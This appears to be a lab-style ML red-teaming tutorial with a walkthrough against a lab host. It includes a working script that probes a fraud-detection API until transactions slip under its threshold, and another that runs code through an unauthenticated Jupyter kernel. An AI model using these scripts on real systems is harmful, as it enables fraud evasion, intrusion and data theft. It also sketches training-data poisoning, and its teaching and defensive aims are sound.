---
icon: hexagon-nodes
cover: ../.gitbook/assets/uzlvztwsf3ob-vritrasec.png
coverY: 73.44062535216767
---

# Intro to AI Red Teaming

***

### Core Concept

Red teaming ML-based systems is a whole different beast compared to going after a web app or a network. The reason is that ML systems aren't just a server with endpoints  they're a stack of moving parts: training pipelines, inference engines, data stores, APIs, feedback loops, model weights. Each of those interaction points is a potential attack surface, and classical pentesting scopes often miss that completely.

The core idea here is: if you want to actually stress-test an AI/ML system, a time-boxed pentest scoped to "check the API" isn't going to cut it. You need a red team engagement  something that operates adversarially, over time, across the entire architecture.

Why should an attacker care? Because ML systems are being deployed for high-stakes decisions  fraud detection, authentication, threat detection, hiring tools, medical diagnosis. Compromising one doesn't just mean data exfil, it can mean silently poisoning decisions at scale without anyone noticing.

***

### How It Works

#### The Three Tiers of Security Assessment

There's a mental model here that's worth locking in because it'll come up every time you're scoping an engagement or explaining your approach to a client.

Think of it like a pyramid. At the base, wide and shallow: **Vulnerability Assessments**. In the middle: **Penetration Testing**. At the top, narrow and deep: **Red Teaming**.

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

#### Red Team Assessment

This is where things get serious. A red team engagement is an adversarial simulation — you're not a scanner, you're role-playing a motivated, sophisticated threat actor. The red team's goal isn't to find every vulnerability. It's to achieve a specific objective: exfiltrate sensitive data, manipulate model outputs, achieve persistence in the ML infrastructure, whatever the worst-case scenario looks like for that organization.

What makes red teaming different:

* **Stealth matters** — you're actively trying to evade the blue team, not just document findings
* **Social engineering, phishing, physical access** are all in scope — it's not just technical
* **Time horizon is longer** — weeks to months, not days
* **Scope is the whole organization**, not just a component

For ML systems specifically, this is the right approach because:

1. Attack paths often span multiple components — you might start by poisoning training data ingested from a third-party source, which eventually degrades model performance in a targeted way, which causes downstream business logic to fail. That kill chain is invisible to a scoped pentest.
2. Many attacks require time — adversarial example crafting, model inversion, data poisoning — these aren't "fire one payload and check the response" attacks.
3. The interaction points between components are where the interesting vulnerabilities live. Scoping individual components misses this entirely.

#### Vulnerability Assessment

This is the most automated and least invasive tier. You're running scanners — think Nessus, OpenVAS — and the output is a list: here's what's known-bad, here's the CVE, here's the CVSS score, here's what you should patch. No exploitation happens. You're cataloging, not attacking.

It's useful as a hygiene check, but it tells you almost nothing about how an attacker would actually chain things together or whether a theoretical vuln is actually reachable in your environment.

***

#### Penetration Testing

A pentest is focused and time-boxed. You have a defined scope — maybe it's a specific API, a specific subnet, a specific web application instance. You go in, you find vulns, you attempt to exploit them, you write a report.

The key constraint is scope. That's both the strength and the weakness of a pentest. For ML-based systems, this is particularly limiting — because if you only scope the inference API, you completely miss the training pipeline, the data ingestion layer, the model registry, the feedback loop. An attacker might not care about your API at all — they might target your training data.

***

#### Red Team Assessment

This is where things get serious. A red team engagement is an adversarial simulation — you're not a scanner, you're role-playing a motivated, sophisticated threat actor. The red team's goal isn't to find every vulnerability. It's to achieve a specific objective: exfiltrate sensitive data, manipulate model outputs, achieve persistence in the ML infrastructure, whatever the worst-case scenario looks like for that organization.

What makes red teaming different:

* **Stealth matters** — you're actively trying to evade the blue team, not just document findings
* **Social engineering, phishing, physical access** are all in scope — it's not just technical
* **Time horizon is longer** — weeks to months, not days
* **Scope is the whole organization**, not just a component

For ML systems specifically, this is the right approach because:

1. Attack paths often span multiple components — you might start by poisoning training data ingested from a third-party source, which eventually degrades model performance in a targeted way, which causes downstream business logic to fail. That kill chain is invisible to a scoped pentest.
2. Many attacks require time — adversarial example crafting, model inversion, data poisoning — these aren't "fire one payload and check the response" attacks.
3. The interaction points between components are where the interesting vulnerabilities live. Scoping individual components misses this entirely.

***

### **Scenario**

I'm on a red team engagement against a fintech startup. Objective is to assess the security of their fraud detection ML pipeline. The client says "we just want the API tested." I already know that's not enough  I'm going to map the full ML stack.

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

***

#### Initial Recon: Port Scan

First thing every time — figure out what's actually running. I don't assume anything about the stack until I see the ports.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ rustscan -a 10.10.10.100 --ulimit 5000 -- -sV -sC -oN initial_scan.txt
```

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.

Open 10.10.10.100:22
Open 10.10.10.100:80
Open 10.10.10.100:5000
Open 10.10.10.100:5001
Open 10.10.10.100:8888

Starting Nmap scan on: 10.10.10.100

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu
80/tcp   open  http          nginx/1.18.0
5000/tcp open  http          Werkzeug/2.3.4 Python/3.10.12
5001/tcp open  http          MLflow Tracking Server
8888/tcp open  http          Jupyter Notebook 6.5.4
```

Okay. This is more than "just an API." Five ports, and three of them are ML-specific:

* **5000** — Flask inference API (the client told me to only look here)
* **5001** — MLflow Tracking Server (the model registry and experiment tracker)
* **8888** — Jupyter Notebook (live data science environment, likely has training code)

A scoped pentest would've stopped at 5000. I'm not doing that.

***

#### Inference API Recon (Port 5000)

Start with what the client pointed me to. Poke the API, understand what it does.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s http://10.10.10.100:5000/ | python3 -m json.tool
```

```json
{
  "service": "FraudDetect API v1.2",
  "endpoints": [
    "/predict",
    "/health",
    "/model/info"
  ],
  "status": "running"
}
```

The `/model/info` endpoint is already suspicious — why does a production API expose model metadata? Let me pull it.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s http://10.10.10.100:5000/model/info | python3 -m json.tool
```

```json
{
  "model_name": "fraud_xgb_v3",
  "model_version": "3.2.1",
  "features": [
    "transaction_amount",
    "merchant_category",
    "hour_of_day",
    "user_avg_spend",
    "velocity_score",
    "geo_risk_score"
  ],
  "threshold": 0.72,
  "training_date": "2024-11-14",
  "mlflow_run_id": "8fa3bc91d4e2"
}
```

This is a goldmine. I now know:

* Every feature the model uses
* The exact classification threshold (0.72) — meaning if I craft a transaction that scores 0.71, it bypasses fraud detection
* The MLflow run ID — which I can use to pull the actual model artifact

This is already enough to craft adversarial inputs, but let's go deeper.

***

#### Probing the Inference Endpoint

Now I understand the feature space. Let me send a legit-looking prediction request and see the full response.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s -X POST http://10.10.10.100:5000/predict \
  -H "Content-Type: application/json" \
  -d '{
    "transaction_amount": 4500,
    "merchant_category": "electronics",
    "hour_of_day": 2,
    "user_avg_spend": 120,
    "velocity_score": 9,
    "geo_risk_score": 8
  }' | python3 -m json.tool
```

```json
{
  "prediction": "FRAUD",
  "confidence": 0.94,
  "fraud_score": 0.94,
  "features_used": 6,
  "model_version": "3.2.1"
}
```

The API is leaking the raw `fraud_score` in the response. That's the critical issue. With this, I can do a black-box score oracle attack — keep tweaking inputs until the score drops below 0.72. Let me demonstrate.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ cat threshold_probe.py
```

```python
# threshold_probe.py
# Oracle attack — binary-search the fraud_score by adjusting features
# Goal: find input values that score just under 0.72 (the bypass threshold)

import requests
import json

TARGET = "http://10.10.10.100:5000/predict"

# Start from a clearly fraudulent baseline, walk it down
base_payload = {
    "transaction_amount": 4500,
    "merchant_category": "electronics",
    "hour_of_day": 2,
    "user_avg_spend": 120,
    "velocity_score": 9,
    "geo_risk_score": 8
}

def probe(payload):
    r = requests.post(TARGET, json=payload)
    data = r.json()
    return data.get("fraud_score", 1.0)

# Walk velocity_score down until we cross the threshold
print("[*] Probing velocity_score to find bypass point...\n")
for v in range(9, 0, -1):
    payload = base_payload.copy()
    payload["velocity_score"] = v
    score = probe(payload)
    status = "BYPASS" if score < 0.72 else "FLAGGED"
    print(f"    velocity_score={v}  ->  fraud_score={score:.4f}  [{status}]")
    if score < 0.72:
        print(f"\n[+] Bypass found at velocity_score={v}")
        print(f"[+] Fraud score: {score:.4f} (threshold: 0.72)")
        break
```

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ python3 threshold_probe.py
```

```
[*] Probing velocity_score to find bypass point...

    velocity_score=9  ->  fraud_score=0.9401  [FLAGGED]
    velocity_score=8  ->  fraud_score=0.8812  [FLAGGED]
    velocity_score=7  ->  fraud_score=0.8103  [FLAGGED]
    velocity_score=6  ->  fraud_score=0.7489  [FLAGGED]
    velocity_score=5  ->  fraud_score=0.6977  [BYPASS]

[+] Bypass found at velocity_score=5
[+] Fraud score: 0.6977 (threshold: 0.72)
```

There it is. A transaction with `velocity_score=5` bypasses fraud detection entirely even though everything else screams fraud. This is a direct consequence of the API leaking the raw score — without that leak, this attack would require thousands of blind queries. With it, I found the bypass in 5 requests.

***

#### MLflow Tracking Server (Port 5001)

Now I pivot to the part a pentest would have never touched. The MLflow tracking server at port 5001.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s http://10.10.10.100:5001/api/2.0/mlflow/experiments/list | python3 -m json.tool
```

```json
{
  "experiments": [
    {
      "experiment_id": "1",
      "name": "fraud_detection_xgb",
      "artifact_location": "mlflow-artifacts:/1",
      "lifecycle_stage": "active",
      "tags": {
        "mlflow.user": "data-team@fintech.internal",
        "mlflow.source.git.repoURL": "git@github.com:fintech-internal/fraud-ml.git"
      }
    }
  ]
}
```

No authentication. I can see the internal email, the private GitHub repo URL, and the full experiment structure. Let me enumerate runs under this experiment to find the production model run.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s "http://10.10.10.100:5001/api/2.0/mlflow/runs/search" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"experiment_ids": ["1"], "max_results": 5}' | python3 -m json.tool
```

```json
{
  "runs": [
    {
      "info": {
        "run_id": "8fa3bc91d4e2",
        "status": "FINISHED",
        "start_time": 1731542400000,
        "end_time":   1731545800000,
        "artifact_uri": "mlflow-artifacts:/1/8fa3bc91d4e2/artifacts"
      },
      "data": {
        "metrics": {
          "accuracy": 0.9871,
          "precision": 0.9643,
          "recall": 0.9712,
          "threshold": 0.72
        },
        "params": {
          "n_estimators": "300",
          "max_depth": "6",
          "learning_rate": "0.05",
          "scale_pos_weight": "12"
        },
        "tags": {
          "mlflow.runName": "prod_fraud_xgb_v3",
          "deployed": "true"
        }
      }
    }
  ]
}
```

That `8fa3bc91d4e2` run ID matches what the inference API leaked. This is the production model. I now have the full hyperparameter set — `n_estimators`, `max_depth`, `learning_rate`, `scale_pos_weight`. With this I can reconstruct a near-identical local model and do white-box adversarial crafting instead of black-box probing.

Let me download the actual model artifact.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s "http://10.10.10.100:5001/api/2.0/mlflow/artifacts/list?run_id=8fa3bc91d4e2&path=" \
  | python3 -m json.tool
```

```json
{
  "files": [
    {
      "path": "model/model.xgb",
      "is_dir": false,
      "file_size": 2847392
    },
    {
      "path": "model/feature_importance.json",
      "is_dir": false,
      "file_size": 1204
    },
    {
      "path": "data/training_sample.csv",
      "is_dir": false,
      "file_size": 8419204
    }
  ]
}
```

`training_sample.csv` — that's training data sitting in the artifact store. Let me pull it.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s "http://10.10.10.100:5001/get-artifact?run_uuid=8fa3bc91d4e2&path=data/training_sample.csv" \
  -o training_sample.csv

┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ wc -l training_sample.csv && head -3 training_sample.csv
```

```
84201 training_sample.csv

transaction_id,user_id,transaction_amount,merchant_category,hour_of_day,user_avg_spend,velocity_score,geo_risk_score,label
TXN_00001,USR_4821,234.50,groceries,14,198.20,2,1,0
TXN_00002,USR_0093,8900.00,electronics,3,145.00,8,9,1
```

84,000 real transactions including user IDs and transaction IDs. That's a PII breach sitting on an unauthenticated endpoint. I didn't even need to exploit anything — the data was just there.

***

#### Jupyter Notebook (Port 8888)

Last pivot. Port 8888 — Jupyter running in production. This tripped me up at first because I expected auth. Jupyter has token-based auth by default but it's trivially misconfigured.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ curl -s http://10.10.10.100:8888/api/kernels
```

```json
[
  {
    "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "name": "python3",
    "last_activity": "2024-11-18T04:22:11.000Z",
    "execution_state": "idle",
    "connections": 1
  }
]
```

No token required. There's an active Python kernel sitting idle. I can execute arbitrary code in it via the WebSocket kernel API. Let me use the REST API to run a command through the running kernel.

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ cat jupyter_exec.py
```

```python
# jupyter_exec.py
# Execute arbitrary code via Jupyter's unauthenticated kernel API
# This gives RCE on the ML training server

import requests
import json
import websocket
import time
import uuid

BASE = "http://10.10.10.100:8888"
KERNEL_ID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"

def execute_code(code):
    ws_url = f"ws://10.10.10.100:8888/api/kernels/{KERNEL_ID}/channels"
    ws = websocket.create_connection(ws_url)

    msg_id = str(uuid.uuid4())
    execute_msg = {
        "header": {
            "msg_id": msg_id,
            "username": "sn0x",
            "session": str(uuid.uuid4()),
            "msg_type": "execute_request",
            "version": "5.0"
        },
        "parent_header": {},
        "metadata": {},
        "content": {
            "code": code,
            "silent": False,
            "store_history": False,
            "user_expressions": {},
            "allow_stdin": False
        }
    }

    ws.send(json.dumps(execute_msg))

    # Read responses until we get execute_reply
    output = []
    while True:
        raw = ws.recv()
        msg = json.loads(raw)
        if msg["msg_type"] == "stream":
            output.append(msg["content"]["text"])
        if msg["msg_type"] == "execute_reply":
            break

    ws.close()
    return "".join(output)

# Proof of concept — just whoami and env
print("[*] Executing: whoami")
print(execute_code("import os; print(os.popen('whoami').read())"))

print("[*] Executing: list training scripts")
print(execute_code("import os; print(os.popen('ls -la /home/data-team/').read())"))
```

```
┌──(sn0x㉿sn0x)-[~/HTB/RedTeamingML]
└─$ python3 jupyter_exec.py
```

```
[*] Executing: whoami
data-team

[*] Executing: list training scripts
total 64
drwxr-xr-x 4 data-team data-team 4096 Nov 18 04:20 .
drwxr-xr-x 6 root      root      4096 Nov 10 12:01 ..
-rw-r--r-- 1 data-team data-team  512 Nov 14 09:33 .bash_history
drwxr-xr-x 2 data-team data-team 4096 Nov 14 09:15 notebooks
drwxr-xr-x 3 data-team data-team 4096 Nov 14 09:15 pipeline
-rw------- 1 data-team data-team  128 Nov 14 09:33 .mlflow_credentials
-rw-r--r-- 1 data-team data-team 2048 Nov 14 09:15 retrain_pipeline.py
```

RCE as `data-team` on the training server. I can read `.mlflow_credentials`, modify `retrain_pipeline.py` to inject poisoned training data, and the next scheduled retrain will silently degrade the model. The blue team will see nothing  the model is still running, the API still responds, the fraud scores just start drifting.

***

#### Attack Flow

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

A pentest scoped to port 5000 finds a minor info disclosure. A red team engagement finds RCE, model theft, PII exfiltration, and a persistent poisoning vector. That's the difference.

***

### In Short

The biggest thing I internalized here is the **why red teaming over pentesting for ML**. It comes down to two things: time and scope.

ML attacks are often not instant exploits. Poisoning a dataset, crafting adversarial examples that are robust across model updates, performing model inversion to extract training data  these take time. A 5-day pentest window doesn't accommodate that.

And scope  traditional pentests are scoped around infrastructure concepts (this app, this subnet). ML systems don't carve cleanly at those boundaries. The real risk surface is the entire pipeline, including third-party data sources, model storage, APIs, and the humans operating the system.

This also made me think differently about what "compromise" means in an ML context. With a web app, compromise usually means RCE or data dump. With an ML system, compromise might look completely invisible  the model is still running, the API still responds, but outputs have been silently shifted. The blue team might not even realize they've been hit.

***

### Attack / Defense Perspective

**From the attacker's side**, ML systems are attractive because they're complex and defenders often don't understand the attack surface well. Security teams know how to monitor for SQLi or suspicious auth attempts. They don't necessarily know how to detect model poisoning or adversarial input crafting. The asymmetry of knowledge is a huge advantage.

The attack surface expands across multiple layers: the data pipeline (poisoning), the model itself (extraction, inversion, evasion), the serving infrastructure (standard API vulns, MLOps tooling misconfigs), and the human operators (social engineering, phishing).

**From the defender's side**, the challenge is that ML security isn't just infosec — it requires ML expertise too. You need people who understand both how neural networks work and how attackers operate. That's a rare combination. Defenders also struggle with the fact that ML systems don't have clean "pass/fail" security states a slightly degraded model might not trigger any alert.

The right defensive posture combines: hardening the MLOps infrastructure (auth on MLflow, model registries, etc.), monitoring for anomalous inference patterns, auditing training data provenance, and running regular red team exercises that specifically target the ML components, not just the surrounding infrastructure.

***
